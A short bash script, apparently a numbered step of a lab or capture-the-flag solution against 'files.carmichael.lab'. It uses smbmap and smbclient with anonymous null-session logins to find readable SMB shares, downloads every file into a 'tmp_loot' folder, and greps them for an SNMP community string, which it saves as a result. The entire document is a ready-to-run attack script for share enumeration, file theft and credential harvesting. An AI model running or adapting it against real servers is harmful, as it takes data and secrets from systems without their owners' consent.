#!/bin/bash
mkdir -p results tmp_loot
secret=""
for share in $(smbmap -H files.carmichael.lab -u "" -p "" 2>/dev/null | tr -d '\r' |
               awk '$2 ~ /^READ/ && $1 != "public" && $1 ~ /^[a-zA-Z0-9_-]+$/ {print $1}'); do
  files=$(smbclient //files.carmichael.lab/"$share" -N -c "ls" 2>/dev/null | awk '$2 == "N" {print $1}')
  for f in $files; do
    smbclient //files.carmichael.lab/"$share" -N -c "get $f tmp_loot/$f" >/dev/null 2>&1
  done
done
secret=$(grep -rhoE 'SNMP_COMMUNITY="[^"]+"' tmp_loot 2>/dev/null | head -n 1)
printf '%s\n' "$secret" | tee results/5-smb_share_loot.txt
